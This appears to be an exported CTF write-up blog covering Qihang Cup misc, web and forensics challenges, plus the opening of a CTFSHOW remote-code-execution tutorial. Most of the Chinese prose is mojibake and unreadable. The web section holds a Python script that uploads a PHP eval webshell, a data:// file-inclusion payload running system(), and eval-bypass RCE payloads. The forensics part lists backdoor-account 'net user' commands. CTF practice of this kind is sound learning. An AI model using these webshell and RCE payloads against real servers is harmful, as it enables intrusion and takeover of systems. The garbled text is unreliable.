çŒœçŒœè¿™æ˜¯å“ªï¼Ÿ\n\nè¿™é“é¢˜å½“æ—¶æ²¡å‡ºï¼Œåæ¥åœ¨ç¾¤é‡Œé—®å‡ºé¢˜äººè§£é¢˜æ€è·¯ï¼Œå‡ºé¢˜äººè¯´ç¬¬ä¸€ä¸ªosintæ˜¯é™å¿ƒæ‹æ‘„çš„ï¼Œç¬¬äºŒä¸ªosintçº¯çº¯éšæ‰‹æ‹\n\nä½†æ˜¯æˆ‘æ²¡æƒ³åˆ°è¿™é¢˜æœ€å20å¤šè§£ï¼Œä¼°è®¡æ˜¯è¢«pyçƒ‚äº†ï¼Œç¾¤é‡Œçš„å¤§å“¥è¯´å»å¤§ä¼—ç‚¹è¯„æ‰¾é…’åº—ï¼Œä¸èƒ½æ‰¾åé¢çš„é“¶è¡Œï¼Œé“¶è¡Œå¤ªå¤šäº†ï¼Œé…’åº—åè€Œå¥½æ‰¾\n\næˆ‘æ˜¯æ²¡è¯è¯´äº†ï¼Œèƒ½æ‰¾åˆ°æ„Ÿè§‰ä¹Ÿæ˜¯ç‹—è¿ï¼Œæˆ‘æ˜¯æ²¡ç‹—è¿äº†\n\n![ä½ çŒœçŒœè¿™æ˜¯å“ªï¼Ÿ.jpg](http://Liang-WW.github.io/images/202501/å¯èˆªæ¯/ä½ çŒœçŒœè¿™æ˜¯å“ªï¼Ÿ.jpg)\n\n### ä½ èƒ½çœ‹æ‡‚è¿™ä¸²æœªçŸ¥çš„æ–‡å­—å—\n\nè¿™é¢˜å½“æ—¶ä¹Ÿæ²¡å‡ºï¼Œå¾ˆæ—©å°±æ‰¾åˆ°ç¾Šæ–‡äº†ä½†æ˜¯æ‰”åˆ°éšæ³¢é€æµæ¢­å“ˆæ²¡æœ‰æˆåŠŸæˆ‘å°±å¾ˆæ‡µé€¼\n\n![ä½ èƒ½çœ‹æ‡‚è¿™ä¸²æœªçŸ¥çš„æ–‡å­—å—.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/ä½ èƒ½çœ‹æ‡‚è¿™ä¸²æœªçŸ¥çš„æ–‡å­—å—.png)\n\nåœ¨è´´å§æ‰¾åˆ°ç¾Šæ–‡å¯¹ç…§è¡¨\n\n![ç¾Šæ–‡å¯¹ç…§è¡¨.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/ç¾Šæ–‡å¯¹ç…§è¡¨.png)\n\nç¿»è¯‘ä¹‹åæ˜¯\n\n```\nszfpguw\nizgwesq\nzoaoerh\n```\n\nä½†æ˜¯æ”¾åˆ°éšæ³¢é€æµé‡Œé¢æ¢­å“ˆæ²¡å‡ºæ¥ï¼Œèµ›åå¤§å¸ˆå‚…åœ¨ç¾¤é‡Œè¯´æ˜¯ç»´å‰å°¼äºš\n\nlsbéšå†™\n\nb1,rgb,lsb,xy .. text: \"qihangbeiiseasy\"\n\nç„¶ååœ¨ç”¨éšæ³¢é€æµç»´å‰å°¼äºšè§£å¯†å°±å®Œç¾è§£å‡º\n\n`cryptoveryeasybysheeb`\n\nåŒ…ä¸Š{}å’Œflagå°±è¡Œ\n\n### PvzHE\n\nè¿™ä¸ªæ˜¯æ¤ç‰©å¤§æˆ˜åƒµå°¸çš„é‚£ä¸ªpvzæ˜¯Demonåšçš„ï¼Œè¿›å»ç›´æ¥æ‰¾åˆ°images\n\næœ‰ä¸€ä¸ªå›¾ç‰‡ç›´æ¥å°±æ˜¯flag\n\n![ZombieNote1.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/ZombieNote1.png)\n\n\n\n### çŒ¿ç±»çš„ç¼–ç¨‹è¯­è¨€ä½ äº†è§£å—\n\n![çŒ¿ç±»çš„ç¼–ç¨‹è¯­è¨€ä½ äº†è§£å—.jpg](https:///Liang-WW.github.io/images/202501/å¯èˆªæ¯/çŒ¿ç±»çš„ç¼–ç¨‹è¯­è¨€ä½ äº†è§£å—.jpg)\n\nç”¨jphsè¿™ä¸ªå·¥å…·ï¼Œä½†æ˜¯ä»¥å‰æ²¡æ¥è§¦è¿‡å›¾ç‰‡è¿˜æœ‰è¿™ä¸ªæ–¹å‘çš„ä¸œè¥¿ï¼Œåæ¥åœ¨æˆ‘çš„ä¸çŸ¥é“å“ªä¸ªè€å­¦é•¿ç¥–ä¼ ä¸‹æ¥çš„å·¥å…·åŒ…é‡Œé¢å°±æœåˆ°äº†\n\nä½†æ˜¯è¦å¯†ç æˆ‘ä¸çŸ¥é“åœ¨å“ªï¼Œç­‰ç€å®˜æ–¹wpä¸‹æ¥ä¹‹ååœ¨çœ‹çœ‹å§ï¼Œ(æ ¹æœ¬æ²¡ç§˜å¯†æˆ‘çœŸæœäº†ï¼Œä½†æ˜¯æˆ‘é¼ æ ‡ç‚¹å‡»å°±æŠ¥é”™ï¼Œå›è½¦å°±è¡Œäº†)å¯¼å‡ºè¿™ä¸ªhideä¹‹åæ˜¯ookè§£å¯†è¿™é¢˜æ¯”è¾ƒmiscæœ‰ç‚¹å¥½ç©\n\n```\n.. .. .. .. .. .. .. .. .. .. !? .? .. .? .. .. .. .? .. .. .. .. .. .. .. .? .. .. .. .. .. .. .. .. .. .. ?. ?. ?. ?. !! ?! .? .? .? .. .. .. .. .. .. .. .. .. .. .. !. !! !! !! !! !! !! !! !! !! !. !! !! !! !! !! !. .? !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !. ?. .. .. .. !. .? .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !. ?. ?. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !. .? .? !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !! !. ?. ?. .. .. .. !. !. .? .? !. ?. ?. !! !! !! !! !! !. .? .? .. !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !. .? .? !! !! !! !! !. ?. ?. .. .. .. .. .. .. .. .. !. .? .? !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !! !! !! !! !! !. .. .. .. .. .. .. .. !. !! !! !! !! !. .? .? .. .. .. .. !. !! !! !! !! !. ?. ?. !! !! !! !. .. .. .. .. .. .. .. .. .. .. .. !. !! !! !! !! !! !! !! !! !. .? .? .. .. .. .. .. !. ?. ?. .. .. .. .. !. !! !! !! !! !! !! !! !. .? .? !! !! !! !! !. .. !. ?. ?. .. .. .. .. .. .. !. .. .. .. !. !! !! !! !! !! !! !. .. .. .. !. .? .? !! !! !. ?. ?. !! !! !! !. .? .? .. .. .. .. !. !! !! !! !! !. ?. ?. .. .. .. !. .. .. .. .. .. .. !. .? .? .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. !.\n```\n\nookè§£å¯†[https://www.splitbrain.org/services/ook](https://www.splitbrain.org/services/ook)ç›´æ¥æ¢­å“ˆäº†\n\n\n\n### ______å¯åŠ¨ï¼\n\nè¿™é¢˜æ˜¯Demonè§£å‡ºçš„\n\n![å¯åŠ¨1.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/å¯åŠ¨1.png)\n\næ‰¾åˆ°è¿™ä¸ªæµé‡åŒ…ï¼Œ![å¯åŠ¨2.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/å¯åŠ¨2.png)\n\ntcpè¿½è¸ªæµ\n\nä½†æ˜¯Demonæ˜¯æ‰¾çš„aiç›´æ¥å°±åå‡ºæ¥äº†å…·ä½“è§£æ³•æ²¡ç»™å‡º\n\n### QHCTF For Year 2025\n\nè¿™ä¸ªé¢˜ä¹Ÿæ˜¯Demonå‡ºçš„æ ¹æ®hintå¯¹ç€æ—¥å†ä¸€ä¸ªä¸ªç”»å‡ºæ¥å°±èƒ½æ‹¼å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¹ˆç®€å•çš„æ€è·¯qité‚£è¾¹ç«Ÿç„¶æ²¡äººåšå‡ºæ¥\n\nä»€ä¹ˆæ—¶å€™qitèƒ½æ¥ä¸ªå¤§çˆ¹å¸®æˆ‘åˆ†æ‹…ä¸€ä¸‹å‹åŠ›å•Š\n\n```\nhint:\n080714212829302316092230-04111825121306132027-0605041118252627-08091009162330-0102031516170108152229-0108142229-0203041617180209162330-0108152229303124171003-231609021725181104-01020917233029\n```\n\n![æ—¥å†.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/æ—¥å†.png)\n\næœ€åæ‹¼å‡ºæ¥æ˜¯QHCTF{FUN}è¿™ä¸ªé¢˜æ²¡å•¥æ„æ€\n\n\n\n## WEB\n\n### PCREMagic\n\nå­¦å¼Ÿåšå‡ºæ¥ä¹‹åç»™æˆ‘è¯´æ˜¯phpçŸ­æ ‡ç­¾ç»•è¿‡ï¼Œç„¶åä»–å†™äº†è„šæœ¬ç»™æˆ‘\n\næºç ï¼š\n\n```php\n <?php\nfunction is_php($data){\n     return preg_match('/<\\?php.*?eval.*?\\(.*?\\).*?\\?>/is', $data);\n}\n\nif(empty($_FILES)) {\n    die(show_source(__FILE__));\n}\n\n$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\n$data = file_get_contents($_FILES['file']['tmp_name']);\nif (is_php($data)) {\n    echo \"bad request\";\n} else {\n    if (!is_dir($user_dir)) {\n        mkdir($user_dir, 0755, true);\n    }\n    $path = $user_dir . '/' . random_int(0, 10) . '.php';\n    move_uploaded_file($_FILES['file']['tmp_name'], $path);\n\n    header(\"Location: $path\", true, 303);\n    exit;\n}\n?> 1\n```\n\nå­¦å¼Ÿåšå‡ºæ¥ä¹‹åç»™æˆ‘è¯´æ˜¯phpçŸ­æ ‡ç­¾ç»•è¿‡ï¼Œç„¶åä»–å†™äº†è„šæœ¬ç»™æˆ‘\n\n```python\nimport requests\nurl = 'http://challenge.qihangcup.cn:33842/'\nfile = {'file': ('1.php', '<?=eval($_POST[1]);?>', 'images/png')}\nres = requests.post(url, files=file, allow_redirects=False)\nprint(f\"è·¯å¾„: {url}{res.headers['Location']} ,æœ¨é©¬ä¸ºï¼š1\")\n```\n\n![PCREMagic-PY.png](http://Liang-WW.github.io/images/202501/å¯èˆªæ¯/PCREMagic-PY.png)\n\nç”¨èšå‰‘è¿æ¥,åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag\n\n![èšå‰‘.png](https://Liang-WW.github.io/images/202501/å¯èˆªæ¯/èšå‰‘.png)\n\né‚£ä¹ˆè¿™é“é¢˜å¯¹æˆ‘æ¥è¯´è‚¯å®šä¸æ˜¯è¿™æ ·å°±å¾—è¿‡ä¸”è¿‡äº†\n\nå¼€å§‹å¤ç›˜ï¼š\n\n```php\n <?php\nfunction is_php($data){\n     return preg_match('/<\\?php.*?eval.*?\\(.*?\\).*?\\?>/is', $data);\n}\n//è¿™é‡Œæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œdataä¼ å‚é‡Œé¢ä¸å…è®¸æœ‰â€œ/<\\?php.*?eval.*?\\(.*?\\).*?\\?>//â€isè¿™äº›ä¸œè¥¿ï¼ŒæŠŠ<?php ?>æ ‡ç­¾banäº†\n\nif(empty($_FILES)) {\n    die(show_source(__FILE__));\n}\n\n//è¿™æ®µä»£ç çš„æ„æ€æ˜¯å¦‚æœ$_FILESä¸ºç©ºï¼ˆå³æ²¡æœ‰ä¸Šä¼ çš„æ–‡ä»¶ï¼‰ï¼Œåˆ™æ‰§è¡Œdie(show_source(__FILE__))ï¼Œè¿™ä¼šç»ˆæ­¢ç¨‹åºæ‰§è¡Œå¹¶è¾“å‡ºå½“å‰æ–‡ä»¶çš„æºä»£ç ã€‚å°±æ˜¯è¯´è®©ä½ ä¼ æ–‡ä»¶å‘¢ï¼\n\n\n$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);\n$data = file_get_contents($_FILES['file']['tmp_name']);\nif (is_php($data)) {\n    echo \"bad request\";\n} else {\n    if (!is_dir($user_dir)) {\n        mkdir($user_dir, 0755, true);\n    }\n    $path = $user_dir . '/' . random_int(0, 10) . '.php';\n    move_uploaded_file($_FILES['file']['tmp_name'], $path);\n\n    header(\"Location: $path\", true, 303);\n    exit;\n}\n?> \n```\n\nå› ä¸ºæŠŠå¾ˆå¤šä¸œè¥¿éƒ½banäº† è®©ä¼ æ–‡ä»¶<?php ?>åˆä¸èƒ½ç”¨ï¼Œé‚£å°±ç”¨phpçŸ­æ ‡ç­¾å»å†™ä¸€ä¸ªå°é©¬\n\n#### phpçŸ­æ ‡ç­¾\n\n```\n<?php ?>æ˜¯æ­£å’Œå¸¸æƒ…å†µä¸‹çš„æ ‡ç­¾ï¼Œç”¨äºè¯†åˆ«è¿™æ˜¯ä¸ªphpæ–‡ä»¶ï¼Œä½†phpä¹Ÿå…è®¸ä½¿ç”¨çŸ­æ ‡ç­¾<? ?>å’Œ<?=  >ï¼Œå¯ä»¥ç”¨äºphpè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ã€‚ <? ?>ç­‰ä»·äº<?php ?> <?= >ç­‰ä»·äº<?php echo ?>\nä¸¾ä¸ªä¾‹å­ï¼š\n<?='Hello World'?> Â  Â // è¾“å‡º \"Hello World\"\n```\n\nç»†ç»†å“å‘³ä¸€ä¸‹å­¦å¼Ÿçš„payload\n\n```python\nimport requests\nurl = 'http://challenge.qihangcup.cn:33842/'\nfile = {'file': ('1.php', '<?=eval($_POST[1]);?>', 'images/png')}/*å»ºäº†ä¸€ä¸ªå­—å…¸ï¼Œé”®ä¸º â€œfileâ€ï¼Œå€¼æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚å…ƒç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸² '1.php'ï¼Œä»£è¡¨ä¸€ä¸ªæ–‡ä»¶åï¼›ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸²ä¹Ÿå°±æ˜¯æ–‡ä»¶å†…å®¹ï¼Œimages/pngåº”è¯¥æ˜¯å®šä¹‰æˆpngæ ¼å¼æ–¹ä¾¿ç»•è¿‡å§'*/\nres = requests.post(url, files=file, allow_redirects=False)//å‰©ä¸‹çš„å°±æ˜¯postä¼ å‚äº†\nprint(f\"è·¯å¾„: {url}{res.headers['Location']} ,æœ¨é©¬ä¸ºï¼š1\")//å›æ˜¾èšå‰‘çš„è¿æ¥è·¯å¾„\n```\n\n\n\n### Easy_include\n\næºç ï¼š\n\n```php\n<?php \nerror_reporting(0); \n//flagÂ inÂ flag.php \n$file=$_GET['file']; \nif(isset($file)) \n{ \nÂ Â Â Â if(!preg_match(\"/flag/i\",$file)) \nÂ Â Â Â { \nÂ Â Â Â Â Â Â Â include($file); \nÂ Â Â Â } \nÂ Â Â Â else \nÂ Â Â Â { \nÂ Â Â Â Â Â Â Â echo(\"noÂ noÂ noÂ ~Â \"); \nÂ Â Â Â } \n} \nelse \n{ \nÂ Â Â Â highlight_file(__FILE__); \n} \n\n?> \n```\n\nä¸€ä¸ªç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Œç”¨dataä¼ªåè®®è¯»å–\n\n?file=data://text/plain,<?=system('tac fl*');?>\n\n### Web_IP\n\n\n\n## Forensic\n\næ—©ä¸Šèµ·æ¥å¯èˆªæ¯å¹³å°å…³äº†ï¼Œç­‰ç€åç»­å¹³å°é‡å¯æˆ‘å†å»è¡¥ä¸ŠForensicçš„å¤ç°\n\nä¸­åˆå°±å¼€æ”¾äº†æœäº†ï¼Œæœ¬æ¥è¿˜æƒ³æ­‡ä¼šï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ‹–äº†ä¸¤å¤©å“ˆå“ˆæ ¹æœ¬ä¸æƒ³å­¦ä¹ ã€‚\n\nç»™å‡ºé™„ä»¶ï¼ˆ10Gï¼‰é€šè¿‡ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼šå¯èˆªæ¯å–è¯.7z\né“¾æ¥: https://pan.baidu.com/s/1xZ3bY58Td-OQ6CqyrVpNAw?pwd=23ch æå–ç : 23ch\n\nè§£å‹å¯†ç æ˜¯90382728-ca22-48e7-8413-61f6438f1b90\n\nå…³äºå–è¯è¿™ä¸ªé¢˜ç»™çš„æ˜¯e01æ–‡ä»¶æˆ‘åªä¼šç”¨ftkè¿›è¡ŒæŒ‚è½½è‚¯å®šè¿˜æœ‰åˆ«çš„æ–¹å¼ä½†æ˜¯å¥½åƒè¦æ”¶è´¹\n\nç„¶åç”±äºæˆ‘æŠŠè¿™äº›ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿åŸºæœ¬ä¸Šéƒ½æ”¾åˆ°Dç›˜é‡Œé¢ç„¶åDç›˜æƒé™åªç»™äº†å¯è¯»å’Œå¯å†™æ²¡æœ‰ç»™å®Œå…¨æ§åˆ¶å¯¼è‡´æˆ‘ä¸€ç›´æŒ‚è½½å¥½ä¹Ÿè¿›å»ä¸\n\nä»Šå¤©æ£é¼“çš„æ—¶å€™çªç„¶æƒ³ç€çœ‹ä¸€çœ¼Dç›˜æƒé™æœç„¶è§£å†³é‚£å°±ç»§ç»­çœ‹çœ‹å–è¯\n\né¦–å…ˆå°±æ˜¯[**FTKæŒ‚è½½**](https://blog.csdn.net/qq_32393893/article/details/142825936?fromshare=blogdetail&sharetype=blogdetail&sharerId=142825936&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)ï¼ŒFTKå…¶å®å°±æ˜¯é•œåƒè™šæ‹Ÿä»¿çœŸç”¨çš„ï¼ŒFTKæŒ‚è½½åˆ°æœ¬åœ°ä½ æœ¬åœ°å°±ä¼šå‡ºç°æŒ‚è½½èµ·æ¥çš„ç£ç›˜ï¼Œåœ¨æ­¤ç”µè„‘ä¸­å°±èƒ½ç›´æ¥çœ‹åˆ°ç„¶åå…¶å®å°±èƒ½å¤Ÿæ­£å¸¸è®¿é—®äº†åº”è¯¥æ˜¯è¿™æ ·\n\n![FTKæœ¬åœ°æŒ‚è½½.png](http://Liang-WW.github.io/images/202501/å¯èˆªæ¯/FTKæœ¬åœ°æŒ‚è½½.png)\n\nè¿™ä¸ªæ—¶å€™å¯ä»¥å»è™šæ‹Ÿæœºé‡Œé¢æå»ä»¿çœŸï¼Œä¹Ÿå¯ä»¥ç›´æ¥æœ¬åœ°åšé¢˜ï¼Œåœ¨è¿™æ¬¡å–è¯å¥½åƒwin6å¾ˆéš¾å‡ºè§£ï¼Œå‡ºé¢˜äººè¯´æ˜¯å› ä¸ºwin6ä¼šè¢«æ€æ¯’è½¯ä»¶æ€æ‰\n\n#### Win_01\n\næŸå¤©ï¼Œå°æ˜æ­£åœ¨æŸç½‘ç«™è¿›è¡Œå­¦ä¹ ã€‚çªç„¶ï¼Œä¸€ä½è›¤å®¢ç›¯ä¸Šäº†ä»–ï¼Œå¹¶å‘ä»–å‘é€äº†ä¸€å°é’“é±¼é‚®ä»¶ã€‚ç”±äºå°æ˜åˆšæ¥è§¦ç½‘ç»œå®‰å…¨ï¼Œå¯¹é’“é±¼é‚®ä»¶å¹¶ä¸ç†Ÿæ‚‰ï¼Œä»–ä¸å°å¿ƒä¸‹è½½å¹¶ç‚¹å‡»äº†é‚®ä»¶ä¸­çš„é™„ä»¶ã€‚å½“ä»–åæ¥å­¦ä¹ åˆ°é’“é±¼é‚®ä»¶çš„ç›¸å…³çŸ¥è¯†æ—¶ï¼Œå·²ç»ä¸ºæ—¶æ™šçŸ£ã€‚äºæ˜¯ï¼Œä»–è¯·æ±‚ä½ å¸®åŠ©æ‰¾å‡ºè›¤å®¢çš„ç—•è¿¹ã€‚è¯·ä½ é’ˆå¯¹é™„ä»¶é•œåƒè¿›è¡Œä¸€æ¬¡åº”æ€¥å“åº”ï¼ŒæŸ¥æ‰¾ä»¥ä¸‹flagå€¼ã€‚å‹ç¼©åŒ…é™„ä»¶çš„è§£å‹å¯†ç ä¸ºï¼š90382728-ca22-48e7-8413-61f6438f1b90ã€‚è¯·ä»¥QHCTF{xxxxxxxx}çš„æ ¼å¼æäº¤ç»“æœã€‚\n\n1.æ‰¾å‡ºç³»ç»Ÿä¸­è›¤å®¢çš„ipåœ°å€åŠç«¯å£ï¼Œæäº¤æ–¹å¼è¯·ä»¥QHCTF{md5(127.0.0.1:80)}è¿›è¡Œæäº¤ï¼Œä¾‹å¦‚ï¼šQHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n#### Win_02\n\nè›¤å®¢åœ¨æ§åˆ¶å°æ˜çš„ç³»ç»Ÿåï¼Œåˆ›å»ºäº†ä¸€ä¸ªæœ€é«˜æƒé™çš„åé—¨è´¦æˆ·ï¼Œè¯·ä½ æ‰¾å‡ºè¯¥è´¦æˆ·çš„ç”¨æˆ·ååŠå¯†ç ï¼Œæäº¤æ–¹å¼è¯·ä»¥QHCTF{md5(user_password)}è¿›è¡Œæäº¤ï¼Œä¾‹å¦‚ï¼šQHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\nè¿™ä¸ªæ§åˆ¶ç³»ç»Ÿåçš„æ“ä½œçœ‹C3å¸ˆå‚…çš„ç¬”è®°èƒ½çŸ¥é“ä¸€èˆ¬éƒ½æ˜¯åœ¨powershellçš„è®°å½•é‡Œé¢G:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\nä¹Ÿå°±æ˜¯è¿™ä¸ªè·¯å¾„ä¸‹æœ‰ä¸€ä¸ªæ–‡ä»¶\n\nnet user HackY$ 123456 /add\nnet user HackY$ /de;\nnet user HackY$ /del\nnet user HackY$ 123456 /add\nnet user HackY$ /del\n\n#### Win_04\n\n4.è›¤å®¢åœ¨ç³»ç»Ÿæ•°æ®åº“ä¸­è—äº†ä¸€äº›ä¸œè¥¿ï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­çš„flagå€¼\næäº¤æ–¹å¼ï¼šQHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n\n\n\nè¿™ä¸ªé¢˜æ˜¯åœ¨æ³¨å†Œè¡¨é‡Œé¢æ‰¾åˆ°çš„flag\n\n#### Win_05\n\n5.å°æ˜åœ¨æ‰¾ä½ å¸®å¿™ä¹‹å‰ï¼Œå–Šäº†ä»–çš„ä¸€ä½å¥½å‹å¸®ä»–å…ˆè¡Œå–è¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–å¥½å‹è¿œç¨‹æ‰€ä½¿ç”¨çš„è½¯ä»¶ï¼Œå¹¶æ‰¾å‡ºæ§åˆ¶äº†å¤šå°‘ç§’ï¼Œipæ˜¯ä»€ä¹ˆï¼Œæäº¤æ–¹å¼è¯·ä»¥QHCTF{md5(xxxx_10_127.0.0.1)}è¿›è¡Œæäº¤ï¼Œä¾‹å¦‚ï¼šQHCTF{cef54f47984626c9efbf070c50bfad1b}\n\n\n\n\n\n#### Win_06\n\n6.è¯·ä½ æ‰¾å‡ºè›¤å®¢åœ¨å¯åŠ¨é¡¹ä¸­è—çš„flag\n æäº¤æ–¹å¼ï¼šQHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n\n#### Win_07\n\nè›¤å®¢åœ¨homeç›®å½•ä¸­å­˜æ”¾äº†ä¸€ä¸ªæ¶æ„ç¨‹åºï¼Œè¯·ä½ åˆ†æè¯¥ç¨‹åºï¼Œå¹¶æ‰¾åˆ°å…¶ä¸­çš„flagå€¼\næäº¤æ–¹å¼ï¼šQHCTF{xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx}\n","tags":["-WP -CTF"]},{"title":"å‘½ä»¤æ‰§è¡ŒRCEï¼ˆCTFSHOWï¼‰","url":"/2025/01/23/å‘½ä»¤æ‰§è¡ŒRCEï¼ˆCTFSHOWï¼‰/","content":"\n# RCE        \n\n RCEï¼ˆremote code executeï¼‰ï¼šè¿œç¨‹å‘½ä»¤æ‰§è¡Œæˆ–è€…ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬å¹³æ—¶è¯´çš„rceï¼Œæ¯”å¦‚thinkPHPçš„rceæ¼æ´ï¼Œå³ç®—ä»£ç æ³¨å…¥æ¼æ´ï¼Œä¹Ÿç®—rceæ¼æ´ï¼Œå› ä¸ºæ¸—é€çš„æœ€ç»ˆæƒ…å†µå¯ä»¥å®ç°æ‰§è¡Œå‘½ä»¤æˆ–è€…æ˜¯ä»£ç éƒ½å±äºRCEï¼Œä¾‹å¦‚ä»£ç æ‰§è¡Œã€æ–‡ä»¶åŒ…å«ã€ååºåˆ—åŒ–ã€å‘½ä»¤æ‰§è¡Œï¼Œç”šè‡³æ˜¯å†™æ–‡ä»¶Getshelléƒ½å¯ä»¥å±äºRCE\n\nå…³äºå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘çš„è®¤çŸ¥æ˜¯webçš„åŸºç¡€åŠŸåº•ï¼Œå¾ˆå¤šåˆ«çš„ç§ç±»çš„é¢˜ç›®ä¾‹å¦‚sstiè¿™ç§ç±»å‹çš„æ‰¾åˆ°flagæ—¶ç”¨åˆ°çš„å§¿åŠ¿å’Œå‘½ä»¤æ‰§è¡Œå¾ˆç›¸åƒæ€è·¯ä¹Ÿæ˜¯æ¯”è¾ƒæ¥è¿‘ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€å®šç”±æµ…å…¥æ·±çš„æŠŠåŸºç¡€çš„å‘½ä»¤æ‰§è¡Œpayloadç†è§£é€å½»\n\né¦–å…ˆå°±æ˜¯cat flagï¼ˆåˆ«ç»™æˆ‘è¯´è¿™ä¸ªä½ ä¸ä¼šï¼Œä¸ä¼šè‡ªå·±æŸ¥å»å…¶å®å°±æ˜¯ä¸ªæ‰“å¼€çš„å‘½ä»¤ï¼Œä½†æ˜¯åœ¨æˆ‘åˆšå¼€å§‹è¿›è¡Œç»ƒä¹ çš„æ—¶å€™é¢å¯¹çš„æ˜¯ä¸ªtacï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯åç«¯å†™çš„ä¸œè¥¿ï¼Œå¿…é¡»å€’å™æ‰è¡Œï¼Œä½†æ˜¯è¶Šæ„Ÿè§‰è¶Šä¸å¯¹åŠ²ï¼Œäºæ˜¯æˆ‘å°±å»é—®åæ¥å¾—åˆ°ä¸ªå·®ä¸å¤šçš„ç†è§£\n\ntac æˆ‘çš„ç†è§£æ˜¯ä»catçš„æ–‡ä»¶é‡Œé¢å€’åºå‡ºæ¯ä¸€è¡Œå…¶å®å°±æ˜¯ä¸€ç§ç®€ä¾¿çš„å‘½ä»¤\n\nisset() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULL//å…¶å®å°±æ˜¯ä¿è¯ä½ æ­£å¸¸ä¼ å‚çš„\n\næœ¬ç¯‡æ–‡ç« ä¸»è¦å‚è€ƒè½å¯çš„é­šå¸ˆå‚…çš„[webå‘½ä»¤æ‰§è¡Œå…¥é—¨](https://blog.csdn.net/Aluxian_/article/details/131024590?fromshare=blogdetail&sharetype=blogdetail&sharerId=131024590&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)\tæ˜Ÿ|ç„°å¸ˆå‚…çš„[å‘½ä»¤æ‰§è¡Œè¯¦è§£](https://blog.csdn.net/m0_65409532/article/details/141852711?fromshare=blogdetail&sharetype=blogdetail&sharerId=141852711&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link)(ä½†æ˜¯ç†è®ºåå¤š)è¯´å¤šæ— ç›Šå¤šçœ‹çœ‹é¢˜è¯•ç€åšå‡ é“å°±ä¼šå¾ˆèˆ’æœäº†\n\n\n\n\n\n#### web29\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \nÂ Â Â Â $cÂ =Â $_GET['c']; \nÂ Â Â Â if(!preg_match(\"/flag/i\",Â $c)){ \nÂ Â Â Â Â Â Â Â eval($c); \nÂ Â Â Â } \nÂ Â Â Â  \n}else{ \nÂ Â Â Â highlight_file(__FILE__); \n}\n```\n\nä¼ å‚ç¦æ­¢flagå­—æ®µæ€è·¯:ç”¨é€šé…ç¬¦*è¡¥å……å¥½flag.php,ç„¶åæƒ³åŠæ³•æåˆ°\n\n`?c=system(\"cp fla* example.txt\");`\n\nç§¯ç´¯å§¿åŠ¿,è¿™ç§æƒ…å†µæ˜¯æŒ‡çš„ç”¨å¤åˆ¶å‘½ä»¤æŠŠfla*-- *å·è‡ªåŠ¨è¡¥å……åé¢çš„å†…å®¹å…¶å®å°±æ˜¯æŒ‡çš„flag.php\n\nå¤åˆ¶äº†ä¸€ä»½æ–°çš„å¹¶å‘½åä¸ºexample.txtå†è®¿é—®å³å¯\n\n#### web30\n\n```php\n<?php\nerror_reporting(0); \nif(isset($_GET['c'])){ \n    $c = $_GET['c']; \n    if(!preg_match(\"/flag|system|php/i\", $c)){ \n        eval($c); \n    } \n     \n}else{ \n    highlight_file(__FILE__); \n}\n\npayload:?c=echo exec('nl fla?????');//nlæ˜¯ä¸€ä¸ªæ–‡æœ¬å¤„ç†å‘½ä»¤ï¼Œä¸»è¦ç”¨äºä¸ºæ–‡ä»¶ä¸­çš„è¡Œæ·»åŠ è¡Œå·\n//payloadçš„æ„æ€æˆ‘æ˜¯è¿™æ ·ç¿»è¯‘çš„:è·å–æœ€åä¸€è¡Œè¾“å‡º,ç„¶åè¿™ä¸ªå‘½ä»¤æ˜¯nl fla???,å°±æ˜¯è¯´fla??çš„é‚£ä¸€è¡Œè¦æ˜¾ç¤ºè¡Œå·ç„¶åæ˜¾ç¤ºå‡ºæ¥å†…å®¹\nsystem()\npassthru()//ä¹Ÿæ˜¯ç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤ 